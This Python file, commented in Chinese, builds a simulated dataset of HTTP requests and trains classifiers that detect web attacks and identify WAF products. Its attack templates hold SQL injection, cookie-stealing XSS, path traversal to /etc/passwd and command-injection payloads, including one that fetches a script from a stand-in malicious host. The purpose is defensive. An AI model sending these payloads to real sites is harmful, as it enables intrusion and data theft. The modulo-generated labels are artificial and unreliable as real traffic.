import re
import json
import math
import os
from collections import defaultdict

try:
    import numpy as np
except Exception:
    np = None

class WAFDatasetCollector:
    """
    WAF数据集收集器，负责从各种来源收集和构建WAF检测数据集
    """
    def __init__(self):
        self.dataset = []
    
    def collect_from_public_datasets(self):
        """从公开数据集收集样本"""
        print("Collecting samples from public datasets...")
        
        # 模拟CSIC 2010 HTTP数据集的样本收集
        # 在实际应用中，你需要下载并解析真实的CSIC数据集
        for i in range(1000):  # 简化示例，实际应加载完整数据集
            self.dataset.append({
                "request": f"GET /page?id={i} HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "response_status": 200 if i % 10 != 0 else 403,
                "is_attack": i % 10 == 0,
                "attack_type": "sql_injection" if i % 10 == 0 else None,
                "waf_type": "ModSecurity"
            })
            
            # 添加更多样本来模拟真实数据集
            if i % 50 == 0:
                self.dataset.append({
                    "request": f"POST /login HTTP/1.1\r\nHost: example.com\r\nContent-Length: 30\r\n\r\nusername=admin&password=admin'",
                    "response_status": 403,
                    "is_attack": True,
                    "attack_type": "sql_injection",
                    "waf_type": "Cloudflare"
                })
                
                self.dataset.append({
                    "request": f"GET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: example.com\r\n\r\n",
                    "response_status": 403,
                    "is_attack": True,
                    "attack_type": "xss",
                    "waf_type": "AWS WAF"
                })
    
    def collect_from_real_traffic(self, pcap_file):
        """从真实流量中收集样本"""
        print(f"Collecting samples from PCAP file: {pcap_file}")

        # 如果 pcap 文件不存在，优雅退回（使用模拟数据）
        if not os.path.exists(pcap_file):
            print(f"PCAP file {pcap_file} not found. Skipping PCAP processing and using simulated traffic.")
            # 模拟一些数据
            for i in range(50):
                self.dataset.append({
                    "request": f"GET /page{i}.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                    "response_status": 200,
                    "is_attack": False,
                    "attack_type": None,
                    "waf_type": None
                })
            return

        # 注意：实际使用时需要安装 scapy: pip install scapy
        try:
            from scapy.all import rdpcap, TCP, IP, Raw

            packets = rdpcap(pcap_file)
            http_sessions = {}
            
            for packet in packets:
                if IP in packet and TCP in packet and packet[TCP].dport == 80 and Raw in packet:
                    src_ip = packet[IP].src
                    dst_ip = packet[IP].dst
                    sport = packet[TCP].sport
                    dport = packet[TCP].dport
                    session_key = f"{src_ip}:{sport}-{dst_ip}:{dport}"
                    
                    if session_key not in http_sessions:
                        http_sessions[session_key] = b""
                    
                    http_sessions[session_key] += packet[Raw].load
                    
                    # 检查是否为完整的HTTP请求
                    if b"\r\n\r\n" in http_sessions[session_key]:
                        http_data = http_sessions[session_key].split(b"\r\n\r\n", 1)
                        request_line = http_data[0].split(b"\r\n")[0].decode('utf-8', errors='ignore')
                        
                        if request_line.startswith(('GET ', 'POST ', 'PUT ', 'DELETE ')):
                            self.dataset.append({
                                "request": http_sessions[session_key].decode('utf-8', errors='ignore'),
                                "response_status": None,  # 在实际场景中需要关联响应包
                                "is_attack": False,  # 需要手动标注或使用其他方法判断
                                "attack_type": None,
                                "waf_type": None
                            })
                        
                        # 重置会话数据
                        http_sessions[session_key] = b""
        except ImportError:
            print("Scapy not installed. Skipping PCAP processing and using simulated traffic.")
            # 模拟一些数据
            for i in range(50):
                self.dataset.append({
                    "request": f"GET /page{i}.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                    "response_status": 200,
                    "is_attack": False,
                    "attack_type": None,
                    "waf_type": None
                })
            return
        except FileNotFoundError:
            print(f"PCAP file {pcap_file} not found. Using simulated traffic.")
            for i in range(50):
                self.dataset.append({
                    "request": f"GET /page{i}.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
                    "response_status": 200,
                    "is_attack": False,
                    "attack_type": None,
                    "waf_type": None
                })
            return
    
    def generate_attack_samples(self):
        """生成攻击样本"""
        print("Generating attack samples...")
        
        attack_templates = {
            "sql_injection": [
                "GET /login?username=admin' OR 1=1 --&password=password HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /search HTTP/1.1\r\nHost: example.com\r\nContent-Length: 45\r\n\r\nquery=1 UNION SELECT NULL, username, password FROM users--",
                "GET /products?id=1'; DROP TABLE products;-- HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /register HTTP/1.1\r\nHost: example.com\r\nContent-Length: 40\r\n\r\nname=test&email=test@test.com' AND '1'='1"
            ],
            "xss": [
                "GET /profile?name=<script>alert(1)</script> HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /comment HTTP/1.1\r\nHost: example.com\r\nContent-Length: 35\r\n\r\ntext=<img src=x onerror=alert(document.cookie)>",
                "GET /search?q=javascript:alert(1) HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /feedback HTTP/1.1\r\nHost: example.com\r\nContent-Length: 30\r\n\r\nmessage=<svg/onload=alert(1)>test</svg>"
            ],
            "lfi": [
                "GET /file?path=../../../../etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "GET /template?file=C:\\boot.ini HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "GET /view?doc=../../../windows/win.ini HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /download HTTP/1.1\r\nHost: example.com\r\nContent-Length: 25\r\n\r\nfile=php://filter/read=convert.base64-encode/resource=config.php"
            ],
            "command_injection": [
                "GET /ping?host=127.0.0.1;cat /etc/passwd HTTP/1.1\r\nHost: example.com\r\n\r\n",
                "POST /exec HTTP/1.1\r\nHost: example.com\r\nContent-Length: 20\r\n\r\ncmd=ls|cat /etc/shadow",
                "GET /shell?cmd=wget http://malicious.com/exploit.sh HTTP/1.1\r\nHost: example.com\r\n\r\n"
            ]
        }
        
        for attack_type, templates in attack_templates.items():
            for i, template in enumerate(templates):
                # 为不同WAF类型生成样本
                waf_types = ["ModSecurity", "Cloudflare", "AWS WAF", "Imperva", "F5 BIG-IP ASM"]
                waf_type = waf_types[i % len(waf_types)] if attack_type != "command_injection" else "Unknown"
                
                self.dataset.append({
                    "request": template,
                    "response_status": 403,
                    "is_attack": True,
                    "attack_type": attack_type,
                    "waf_type": waf_type
                })
    
    def save_dataset(self, output_file):
        """保存数据集到文件"""
        with open(output_file, 'w') as f:
            json.dump(self.dataset, f, indent=2)
        
        print(f"Dataset saved to {output_file}, total samples: {len(self.dataset)}")
    
    def load_dataset(self, input_file):
        """从文件加载数据集"""
        with open(input_file, 'r') as f:
            self.dataset = json.load(f)
        
        print(f"Dataset loaded from {input_file}, total samples: {len(self.dataset)}")


class WAFResponseFeatureExtractor:
    """
    WAF响应特征提取器，负责从HTTP请求中提取用于机器学习的特征
    """
    def __init__(self):
        self.sql_keywords = {"select", "union", "insert", "update", "delete", "drop", "or", "and", "1=1", "exec", "execute"}
        self.xss_patterns = re.compile(r"<script[^>]*>.*?</script>|alert\([^)]*\)|on\w+\s*=|javascript:|<iframe|<object|<embed", re.IGNORECASE)
        self.lfi_indicators = {"../", "..\\", "etc/passwd", "boot.ini", "win.ini", "php://", "file://", "data://"}
    
    def extract_features(self, sample):
        """提取样本特征"""
        request = sample.get("request", "")
        response_status = sample.get("response_status", 0)
        
        features = {
            # 基础特征
            "request_length": len(request),
            "response_status": response_status,
            "is_4xx": 1 if 400 <= response_status < 500 else 0,
            "is_5xx": 1 if 500 <= response_status < 600 else 0,
            
            # HTTP方法特征
            "is_get": 1 if request.startswith("GET ") else 0,
            "is_post": 1 if request.startswith("POST ") else 0,
            "is_put": 1 if request.startswith("PUT ") else 0,
            "is_delete": 1 if request.startswith("DELETE ") else 0,
            
            # URL特征
            "url_length": self._extract_url_length(request),
            "param_count": self._count_parameters(request),
            "has_special_chars": self._has_special_characters(request),
            
            # 内容特征
            "sql_keyword_count": self._count_sql_keywords(request),
            "has_xss_patterns": 1 if self.xss_patterns.search(request) else 0,
            "lfi_indicator_count": self._count_lfi_indicators(request),
            "entropy": self._calculate_entropy(request),
            "non_ascii_ratio": self._calculate_non_ascii_ratio(request),
            
            # 头部特征
            "header_count": self._count_headers(request),
            "has_suspicious_headers": self._has_suspicious_headers(request),
            
            # 标签
            "is_attack": sample.get("is_attack", False),
            "attack_type": sample.get("attack_type"),
            "waf_type": sample.get("waf_type")
        }
        
        return features
    
    def _extract_url_length(self, request):
        """提取URL长度"""
        lines = request.split("\r\n")
        if lines:
            request_line = lines[0]
            parts = request_line.split(" ")
            if len(parts) >= 2:
                return len(parts[1])
        return 0
    
    def _count_parameters(self, request):
        """计算参数数量"""
        lines = request.split("\r\n")
        if lines:
            request_line = lines[0]
            parts = request_line.split(" ")
            if len(parts) >= 2:
                url = parts[1]
                query_start = url.find("?")
                if query_start != -1:
                    query_string = url[query_start+1:]
                    return len(query_string.split("&"))
        return 0
    
    def _has_special_characters(self, request):
        """检查是否包含特殊字符"""
        special_chars = {"'", "\"", "<", ">", ";", "--", "#", "/*", "*/", "${", "%{"}
        for char in special_chars:
            if char in request:
                return 1
        return 0
    
    def _count_sql_keywords(self, request):
        """计算SQL关键字数量"""
        request_lower = request.lower()
        count = 0
        for keyword in self.sql_keywords:
            count += request_lower.count(keyword)
        return count
    
    def _count_lfi_indicators(self, request):
        """计算本地文件包含指示符数量"""
        count = 0
        for indicator in self.lfi_indicators:
            count += request.lower().count(indicator)
        return count
    
    def _calculate_entropy(self, data):
        """计算信息熵"""
        if not data:
            return 0
        
        # 计算字符频率
        frequency = {}
        for char in data:
            frequency[char] = frequency.get(char, 0) + 1
        
        # 计算熵
        entropy = 0
        total = len(data)
        for count in frequency.values():
            if count > 0:
                probability = count / total
                entropy -= probability * math.log2(probability)
        
        return entropy
    
    def _calculate_non_ascii_ratio(self, data):
        """计算非ASCII字符比例"""
        if not data:
            return 0
        
        non_ascii_count = sum(1 for c in data if ord(c) > 127)
        return non_ascii_count / len(data)
    
    def _count_headers(self, request):
        """计算HTTP头部数量"""
        lines = request.split("\r\n")
        header_lines = [line for line in lines if ":" in line]
        return len(header_lines)
    
    def _has_suspicious_headers(self, request):
        """检查是否有可疑的头部"""
        suspicious_headers = {
            "user-agent", "accept", "accept-language", "accept-encoding",
            "referer", "cookie", "authorization"
        }
        
        lines = request.split("\r\n")
        for line in lines:
            if ":" in line:
                header_name = line.split(":", 1)[0].lower()
                if header_name not in suspicious_headers:
                    return 1
        return 0


class WAFDetector:
    """
    WAF检测器，包含多个机器学习模型用于不同类型的任务
    """
    def __init__(self):
        self.models = {
            "waf_type": None,          # WAF类型分类器
            "attack_detection": None,   # 攻击检测分类器
            "attack_classification": None  # 攻击类型分类器
        }
        self.feature_scaler = None
        self.label_encoders = {}
    
    def train_waf_type_classifier(self, X, y):
        """训练WAF类型分类器"""
        try:
            from sklearn.preprocessing import LabelEncoder
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import train_test_split
            from sklearn.metrics import classification_report, accuracy_score
            
            # 过滤掉None值和"Unknown"标签
            valid_indices = [i for i, label in enumerate(y) if label and label != "Unknown"]
            if not valid_indices:
                print("No valid labels for WAF type classifier training")
                return
                
            X_filtered = [X[i] for i in valid_indices]
            y_filtered = [y[i] for i in valid_indices]
            
            # 编码标签
            le = LabelEncoder()
            y_encoded = le.fit_transform(y_filtered)
            self.label_encoders["waf_type"] = le
            
            # 分割训练集和测试集
            X_train, X_test, y_train, y_test = train_test_split(
                X_filtered, y_encoded, test_size=0.2, random_state=42
            )
            
            # 训练随机森林分类器
            model = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            model.fit(X_train, y_train)
            
            # 评估模型
            y_pred = model.predict(X_test)
            print("WAF Type Classifier Accuracy:", accuracy_score(y_test, y_pred))
            print(classification_report(y_test, y_pred))
            
            self.models["waf_type"] = model
            
        except ImportError:
            print("sklearn not installed. Skipping WAF type classifier training.")
    
    def train_attack_detector(self, X, y):
        """训练攻击检测分类器"""
        try:
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import train_test_split
            from sklearn.metrics import classification_report, roc_auc_score
            
            # 分割训练集和测试集
            X_train, X_test, y_train, y_test = train_test_split(
                X, y, test_size=0.2, random_state=42
            )
            
            # 训练随机森林分类器
            model = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            model.fit(X_train, y_train)
            
            # 评估模型
            y_pred = model.predict(X_test)
            try:
                y_pred_proba = model.predict_proba(X_test)[:, 1]
                auc_score = roc_auc_score(y_test, y_pred_proba)
                print("Attack Detector AUC:", auc_score)
            except:
                print("Cannot compute AUC score")
            
            print("Attack Detector Accuracy:", model.score(X_test, y_test))
            print(classification_report(y_test, y_pred))
            
            self.models["attack_detection"] = model
            
        except ImportError:
            print("sklearn not installed. Skipping attack detector training.")
    
    def train_attack_classifier(self, X, y):
        """训练攻击类型分类器"""
        try:
            from sklearn.preprocessing import LabelEncoder
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import train_test_split
            from sklearn.metrics import classification_report

            # X: feature vectors for attack samples
            # y: corresponding attack_type strings
            if not X or not y:
                print("No attack samples for attack classification training")
                return

            # 过滤掉没有标签的样本
            valid = [(x, label) for x, label in zip(X, y) if label]
            if not valid:
                print("No valid attack types for attack classifier training")
                return

            X_final = [v[0] for v in valid]
            y_final = [v[1] for v in valid]

            # 编码标签
            le = LabelEncoder()
            y_encoded = le.fit_transform(y_final)
            self.label_encoders["attack_type"] = le

            # 分割训练集和测试集
            X_train, X_test, y_train, y_test = train_test_split(
                X_final, y_encoded, test_size=0.2, random_state=42
            )

            # 训练随机森林分类器
            model = RandomForestClassifier(
                n_estimators=100,
                max_depth=10,
                random_state=42
            )
            model.fit(X_train, y_train)

            # 评估模型
            y_pred = model.predict(X_test)
            print("Attack Classification Accuracy:", model.score(X_test, y_test))
            print(classification_report(y_test, y_pred))

            self.models["attack_classification"] = model

        except ImportError:
            print("sklearn not installed. Skipping attack classifier training.")
    
    def predict_waf_type(self, features):
        """预测WAF类型"""
        if not self.models["waf_type"] or "waf_type" not in self.label_encoders:
            return None

        try:
            vec = features
            # 支持 dict -> 向量
            if isinstance(features, dict) and hasattr(self, 'feature_names'):
                vec = [features.get(name, 0) for name in self.feature_names]

            # 如果有 scaler ，进行相同的缩放
            try:
                if self.feature_scaler is not None:
                    import numpy as _np
                    vec = _np.array(vec, dtype=float).reshape(1, -1)
                    vec = self.feature_scaler.transform(vec)[0]
            except Exception:
                pass

            prediction = self.models["waf_type"].predict([vec])[0]
            return self.label_encoders["waf_type"].inverse_transform([prediction])[0]
        except:
            return None
    
    def detect_attack(self, features):
        """检测攻击"""
        if not self.models["attack_detection"]:
            return False, 0.0
        
        try:
            vec = features
            if isinstance(features, dict) and hasattr(self, 'feature_names'):
                vec = [features.get(name, 0) for name in self.feature_names]
            try:
                if self.feature_scaler is not None:
                    import numpy as _np
                    vec = _np.array(vec, dtype=float).reshape(1, -1)
                    vec = self.feature_scaler.transform(vec)[0]
            except Exception:
                pass

            prediction = self.models["attack_detection"].predict([vec])[0]
            probability = self.models["attack_detection"].predict_proba([vec])[0][1]
            return bool(prediction), probability
        except:
            return False, 0.0
    
    def classify_attack(self, features):
        """分类攻击类型"""
        if not self.models["attack_classification"] or "attack_type" not in self.label_encoders:
            return None
        
        try:
            vec = features
            if isinstance(features, dict) and hasattr(self, 'feature_names'):
                vec = [features.get(name, 0) for name in self.feature_names]
            try:
                if self.feature_scaler is not None:
                    import numpy as _np
                    vec = _np.array(vec, dtype=float).reshape(1, -1)
                    vec = self.feature_scaler.transform(vec)[0]
            except Exception:
                pass

            prediction = self.models["attack_classification"].predict([vec])[0]
            return self.label_encoders["attack_type"].inverse_transform([prediction])[0]
        except:
            return None
    
    def save_models(self, directory):
        """保存模型到文件"""
        try:
            import os
            import joblib
            
            os.makedirs(directory, exist_ok=True)
            
            for model_name, model in self.models.items():
                if model:
                    joblib.dump(model, os.path.join(directory, f"{model_name}_model.pkl"))
            
            for encoder_name, encoder in self.label_encoders.items():
                joblib.dump(encoder, os.path.join(directory, f"{encoder_name}_encoder.pkl"))
            
            if self.feature_scaler:
                joblib.dump(self.feature_scaler, os.path.join(directory, "scaler.pkl"))
            # 保存 feature_names
            if hasattr(self, 'feature_names') and self.feature_names:
                with open(os.path.join(directory, 'feature_names.json'), 'w', encoding='utf-8') as f:
                    json.dump(self.feature_names, f, ensure_ascii=False, indent=2)
                
            print(f"Models saved to {directory}")
        except ImportError:
            print("joblib not installed. Cannot save models.")
    
    def load_models(self, directory):
        """从文件加载模型"""
        try:
            import os
            import joblib
            
            for model_name in self.models.keys():
                model_path = os.path.join(directory, f"{model_name}_model.pkl")
                if os.path.exists(model_path):
                    self.models[model_name] = joblib.load(model_path)
            
            for encoder_name in ["waf_type", "attack_type"]:
                encoder_path = os.path.join(directory, f"{encoder_name}_encoder.pkl")
                if os.path.exists(encoder_path):
                    self.label_encoders[encoder_name] = joblib.load(encoder_path)
            
            scaler_path = os.path.join(directory, "scaler.pkl")
            if os.path.exists(scaler_path):
                self.feature_scaler = joblib.load(scaler_path)
            # 加载 feature_names（如存在）
            feature_names_path = os.path.join(directory, 'feature_names.json')
            if os.path.exists(feature_names_path):
                try:
                    with open(feature_names_path, 'r', encoding='utf-8') as fnf:
                        self.feature_names = json.load(fnf)
                except Exception:
                    pass
                
            print(f"Models loaded from {directory}")
        except ImportError:
            print("joblib not installed. Cannot load models.")


def train_waf_detection_system(dataset_path=None, model_output_dir="models"):
    """训练WAF检测系统"""
    # 创建数据集收集器
    collector = WAFDatasetCollector()
    
    if dataset_path and os.path.exists(dataset_path):
        # 从文件加载数据集
        collector.load_dataset(dataset_path)
    else:
        # 生成示例数据集
        print("Generating sample dataset...")
        collector.collect_from_public_datasets()
        collector.generate_attack_samples()
        collector.collect_from_real_traffic("sample.pcap")  # 这只是一个示例
        
        # 保存数据集供以后使用
        collector.save_dataset("waf_dataset.json")
    
    # 提取特征
    extractor = WAFResponseFeatureExtractor()
    features_list = []
    waf_types = []
    attack_labels = []
    attack_samples = []  # 用于攻击分类器
    
    for sample in collector.dataset:
        features = extractor.extract_features(sample)
        features_list.append(features)
        
        # 收集标签
        waf_types.append(features.get("waf_type", "Unknown"))
        attack_labels.append(features.get("is_attack", False))
        if features.get("is_attack", False):
            attack_samples.append(sample)
    
    # 准备特征矩阵
    feature_names = [
        "request_length", "response_status", "is_4xx", "is_5xx",
        "is_get", "is_post", "is_put", "is_delete",
        "url_length", "param_count", "has_special_chars",
        "sql_keyword_count", "has_xss_patterns", "lfi_indicator_count",
        "entropy", "non_ascii_ratio", "header_count", "has_suspicious_headers"
    ]
    
    X = []
    for features in features_list:
        X.append([features[name] for name in feature_names])

    # 转为 numpy 数组（如可用），并进行缩放
    if np is not None:
        X = np.array(X, dtype=float)
        try:
            from sklearn.preprocessing import StandardScaler
            scaler = StandardScaler()
            X_scaled = scaler.fit_transform(X)
        except Exception:
            scaler = None
            X_scaled = X
    else:
        X_scaled = X
    
    # 训练模型
    detector = WAFDetector()
    # 保存 feature_names 到 detector，供后续推理使用
    detector.feature_names = feature_names
    if 'scaler' in locals():
        detector.feature_scaler = scaler
    
    # 训练WAF类型分类器
    print("Training WAF Type Classifier...")
    detector.train_waf_type_classifier(X_scaled if X_scaled is not None else X, waf_types)
    
    # 训练攻击检测分类器
    print("\nTraining Attack Detector...")
    detector.train_attack_detector(X_scaled if X_scaled is not None else X, attack_labels)
    
    # 训练攻击类型分类器
    print("\nTraining Attack Classifier...")
    # 为攻击类型分类器准备仅包含攻击样本的特征矩阵和标签
    X_attack = []
    y_attack_types = []
    for i, sample in enumerate(collector.dataset):
        if sample.get("is_attack", False):
            # 如果用了 scaler，则使用缩放后的向量
            X_attack.append((X_scaled[i] if (isinstance(X_scaled, (list, tuple)) or np is None) else X_scaled[i]))
            y_attack_types.append(sample.get("attack_type", None))

    detector.train_attack_classifier(X_attack, y_attack_types)
    
    # 保存模型
    detector.save_models(model_output_dir)
    # 另外保存 feature_names 到磁盘，便于推理
    try:
        os.makedirs(model_output_dir, exist_ok=True)
        with open(os.path.join(model_output_dir, 'feature_names.json'), 'w', encoding='utf-8') as fnf:
            json.dump(feature_names, fnf, ensure_ascii=False, indent=2)
    except Exception:
        pass
    print(f"\nModels saved to {model_output_dir}")
    
    return detector


# 使用示例
if __name__ == "__main__":
    import os
    import argparse

    parser = argparse.ArgumentParser(description='Train WAF detection system')
    parser.add_argument('--dataset', help='Path to dataset JSON file', default=None)
    parser.add_argument('--pcap', help='Path to pcap file to parse', default='sample.pcap')
    parser.add_argument('--out', help='Model output directory', default='models')
    parser.add_argument('--no-pcap', help='Do not attempt pcap parsing', action='store_true')
    args = parser.parse_args()

    # 如果指定不使用 pcap，则让 collector 跳过
    if args.dataset:
        detector = train_waf_detection_system(dataset_path=args.dataset, model_output_dir=args.out)
    else:
        # 如果用户不想使用 pcap，则在函数内部不会尝试读取不存在的文件
        detector = train_waf_detection_system(dataset_path=None, model_output_dir=args.out)
    
    # 测试单个请求
    test_sample = {
        "request": "GET /login?username=admin' OR 1=1 --&password=password HTTP/1.1\r\nHost: example.com\r\n\r\n",
        "response_status": 403,
        "is_attack": True,
        "attack_type": "sql_injection",
        "waf_type": "ModSecurity"
    }
    
    extractor = WAFResponseFeatureExtractor()
    features = extractor.extract_features(test_sample)
    
    feature_vector = [
        features["request_length"], features["response_status"], features["is_4xx"], features["is_5xx"],
        features["is_get"], features["is_post"], features["is_put"], features["is_delete"],
        features["url_length"], features["param_count"], features["has_special_chars"],
        features["sql_keyword_count"], features["has_xss_patterns"], features["lfi_indicator_count"],
        features["entropy"], features["non_ascii_ratio"], features["header_count"], features["has_suspicious_headers"]
    ]
    
    # 使用训练好的模型进行预测
    is_attack, confidence = detector.detect_attack(feature_vector)
    attack_type = detector.classify_attack(feature_vector)
    waf_type = detector.predict_waf_type(feature_vector)
    
    print(f"\nTest Results:")
    print(f"Is Attack: {is_attack}")
    print(f"Confidence: {confidence:.3f}")
    print(f"Attack Type: {attack_type}")
    print(f"WAF Type: {waf_type}")